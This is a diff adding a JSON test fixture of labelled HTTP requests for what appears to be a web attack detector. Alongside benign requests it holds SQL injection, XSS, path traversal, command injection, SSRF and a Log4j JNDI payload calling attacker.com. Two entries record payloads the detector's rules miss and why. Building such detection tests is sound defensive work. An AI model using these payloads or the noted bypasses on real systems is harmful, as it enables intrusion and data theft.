@@ -1,0 +1,340 @@
+[
+  {
+    "label": "legit",
+    "description": "Normal GET with pagination",
+    "request": {
+      "method": "GET",
+      "url": "/api/users?page=1&limit=10",
+      "headers": { "content-type": "application/json" },
+      "body": "",
+      "ip_address": "192.168.1.100"
+    },
+    "expected": {
+      "is_threat": false,
+      "threat_level": "SAFE",
+      "recommendation": "ALLOW"
+    }
+  },
+  {
+    "label": "legit",
+    "description": "POST login with JSON body",
+    "request": {
+      "method": "POST",
+      "url": "/api/auth/login",
+      "headers": { "content-type": "application/json" },
+      "body": "{\"username\": \"john_doe\", \"password\": \"mypassword123\"}",
+      "ip_address": "192.168.1.50"
+    },
+    "expected": {
+      "is_threat": false,
+      "threat_level": "SAFE",
+      "recommendation": "ALLOW"
+    }
+  },
+  {
+    "label": "legit",
+    "description": "Product search with normal query",
+    "request": {
+      "method": "GET",
+      "url": "/api/products?category=electronics&sort=price_asc&page=2",
+      "headers": {},
+      "body": "",
+      "ip_address": "10.0.1.5"
+    },
+    "expected": {
+      "is_threat": false,
+      "threat_level": "SAFE",
+      "recommendation": "ALLOW"
+    }
+  },
+  {
+    "label": "attack",
+    "attack_type": "SQL_INJECTION",
+    "description": "UNION-based SQL injection in URL — CRITICAL",
+    "request": {
+      "method": "GET",
+      "url": "/api/users?id=1 UNION SELECT NULL,NULL,NULL--",
+      "headers": {},
+      "body": "",
+      "ip_address": "10.0.0.1"
+    },
+    "expected": {
+      "is_threat": true,
+      "threat_level": "CRITICAL",
+      "recommendation": "BLOCK",
+      "triggering_factor": "critical_signature",
+      "matched_rule_ids": ["SQLI-001"]
+    }
+  },
+  {
+    "label": "attack",
+    "attack_type": "SQL_INJECTION",
+    "description": "OR 1=1 tautology in body",
+    "request": {
+      "method": "POST",
+      "url": "/api/login",
+      "headers": { "content-type": "application/json" },
+      "body": "{\"user\": \"admin\", \"pass\": \"' OR '1'='1\"}",
+      "ip_address": "10.0.0.2"
+    },
+    "expected": {
+      "is_threat": true,
+      "threat_level": "CRITICAL",
+      "recommendation": "BLOCK",
+      "triggering_factor": "critical_signature",
+      "matched_rule_ids": ["SQLI-002"]
+    }
+  },
+  {
+    "label": "attack",
+    "attack_type": "SQL_INJECTION",
+    "description": "DROP TABLE via string termination",
+    "request": {
+      "method": "GET",
+      "url": "/api/users?id=1'; DROP TABLE users--",
+      "headers": {},
+      "body": "",
+      "ip_address": "10.0.0.3"
+    },
+    "expected": {
+      "is_threat": true,
+      "threat_level": "CRITICAL",
+      "recommendation": "BLOCK",
+      "triggering_factor": "critical_signature",
+      "matched_rule_ids": ["SQLI-005"]
+    }
+  },
+  {
+    "label": "attack",
+    "attack_type": "SQL_INJECTION",
+    "description": "Time-based blind SQLi with SLEEP()",
+    "request": {
+      "method": "GET",
+      "url": "/api/orders?filter=1 AND SLEEP(5)--",
+      "headers": {},
+      "body": "",
+      "ip_address": "10.0.0.4"
+    },
+    "expected": {
+      "is_threat": true,
+      "threat_level": "HIGH",
+      "recommendation": "BLOCK",
+      "matched_rule_ids": ["SQLI-006"]
+    }
+  },
+  {
+    "label": "attack",
+    "attack_type": "XSS",
+    "description": "Script tag injection in body",
+    "request": {
+      "method": "POST",
+      "url": "/api/comments",
+      "headers": { "content-type": "application/json" },
+      "body": "{\"text\": \"<script>alert(document.cookie)</script>\"}",
+      "ip_address": "10.0.0.5"
+    },
+    "expected": {
+      "is_threat": true,
+      "threat_level": "CRITICAL",
+      "recommendation": "BLOCK",
+      "triggering_factor": "critical_signature",
+      "matched_rule_ids": ["XSS-001"]
+    }
+  },
+  {
+    "label": "attack",
+    "attack_type": "XSS",
+    "description": "Event handler injection in URL",
+    "request": {
+      "method": "GET",
+      "url": "/api/profile?name=<img src=x onerror=alert(1)>",
+      "headers": {},
+      "body": "",
+      "ip_address": "10.0.0.6"
+    },
+    "expected": {
+      "is_threat": true,
+      "threat_level": "HIGH",
+      "recommendation": "BLOCK",
+      "matched_rule_ids": ["XSS-002"]
+    }
+  },
+  {
+    "label": "attack",
+    "attack_type": "XSS",
+    "description": "JavaScript protocol URI",
+    "request": {
+      "method": "GET",
+      "url": "/api/profile?redirect=javascript:alert(1)",
+      "headers": {},
+      "body": "",
+      "ip_address": "10.0.0.7"
+    },
+    "expected": {
+      "is_threat": true,
+      "threat_level": "HIGH",
+      "recommendation": "BLOCK",
+      "matched_rule_ids": ["XSS-003"]
+    }
+  },
+  {
+    "label": "attack",
+    "attack_type": "PATH_TRAVERSAL",
+    "description": "Basic directory traversal",
+    "request": {
+      "method": "GET",
+      "url": "/api/files?path=../../../etc/passwd",
+      "headers": {},
+      "body": "",
+      "ip_address": "10.0.0.8"
+    },
+    "expected": {
+      "is_threat": true,
+      "threat_level": "HIGH",
+      "recommendation": "BLOCK",
+      "matched_rule_ids": ["PT-001"]
+    }
+  },
+  {
+    "label": "attack",
+    "attack_type": "PATH_TRAVERSAL",
+    "description": "Double-encoded path traversal",
+    "request": {
+      "method": "GET",
+      "url": "/api/files?path=%252e%252e%252fetc%252fpasswd",
+      "headers": {},
+      "body": "",
+      "ip_address": "10.0.0.9"
+    },
+    "expected": {
+      "is_threat": true,
+      "threat_level": "HIGH",
+      "recommendation": "BLOCK",
+      "matched_rule_ids": ["PT-003"]
+    }
+  },
+  {
+    "label": "attack",
+    "attack_type": "PATH_TRAVERSAL",
+    "description": "Sensitive file access (/etc/passwd direct)",
+    "request": {
+      "method": "GET",
+      "url": "/api/render?template=/etc/passwd",
+      "headers": {},
+      "body": "",
+      "ip_address": "10.0.0.10"
+    },
+    "expected": {
+      "is_threat": true,
+      "threat_level": "CRITICAL",
+      "recommendation": "BLOCK",
+      "matched_rule_ids": ["PT-004"]
+    }
+  },
+  {
+    "label": "attack",
+    "attack_type": "COMMAND_INJECTION",
+    "description": "Semicolon command injection in URL",
+    "request": {
+      "method": "GET",
+      "url": "/api/ping?host=127.0.0.1; cat /etc/passwd",
+      "headers": {},
+      "body": "",
+      "ip_address": "10.0.0.11"
+    },
+    "expected": {
+      "is_threat": true,
+      "threat_level": "CRITICAL",
+      "recommendation": "BLOCK",
+      "matched_rule_ids": ["CMDI-001"]
+    }
+  },
+  {
+    "label": "attack",
+    "attack_type": "COMMAND_INJECTION",
+    "description": "Command substitution $() in body",
+    "request": {
+      "method": "POST",
+      "url": "/api/exec",
+      "headers": { "content-type": "application/json" },
+      "body": "{\"cmd\": \"$(id)\"}",
+      "ip_address": "10.0.0.12"
+    },
+    "expected": {
+      "is_threat": true,
+      "threat_level": "HIGH",
+      "recommendation": "BLOCK",
+      "matched_rule_ids": ["CMDI-003"]
+    }
+  },
+  {
+    "label": "attack",
+    "attack_type": "PROTOCOL_ATTACK",
+    "description": "Log4j JNDI injection",
+    "request": {
+      "method": "GET",
+      "url": "/api/search?q=test",
+      "headers": { "x-api-version": "${jndi:ldap://attacker.com/exploit}" },
+      "body": "",
+      "ip_address": "10.0.0.13"
+    },
+    "expected": {
+      "is_threat": true,
+      "threat_level": "CRITICAL",
+      "recommendation": "BLOCK",
+      "matched_rule_ids": ["PROTO-002"]
+    }
+  },
+  {
+    "label": "attack",
+    "attack_type": "PROTOCOL_ATTACK",
+    "description": "SSRF to internal network",
+    "request": {
+      "method": "POST",
+      "url": "/api/fetch",
+      "headers": { "content-type": "application/json" },
+      "body": "{\"url\": \"http://192.168.1.1/admin\"}",
+      "ip_address": "10.0.0.14"
+    },
+    "expected": {
+      "is_threat": true,
+      "threat_level": "HIGH",
+      "recommendation": "BLOCK",
+      "matched_rule_ids": ["PROTO-001"]
+    }
+  },
+  {
+    "label": "known_gap",
+    "attack_type": "SQL_INJECTION",
+    "description": "AND 1=1 without quotes — NOT detected by current rules",
+    "request": {
+      "method": "GET",
+      "url": "/api/products?search=1 AND 1=1",
+      "headers": {},
+      "body": "",
+      "ip_address": "10.0.0.20"
+    },
+    "expected": {
+      "is_threat": false,
+      "recommendation": "ALLOW",
+      "note": "FALSE NEGATIVE — engine misses this pattern"
+    }
+  },
+  {
+    "label": "known_gap",
+    "attack_type": "COMMAND_INJECTION",
+    "description": "Pipe + space before cat — NOT detected",
+    "request": {
+      "method": "GET",
+      "url": "/api/lookup?domain=| cat /etc/passwd",
+      "headers": {},
+      "body": "",
+      "ip_address": "10.0.0.21"
+    },
+    "expected": {
+      "is_threat": false,
+      "recommendation": "ALLOW",
+      "note": "FALSE NEGATIVE — space between | and cat breaks regex \\b boundary"
+    }
+  }
+]
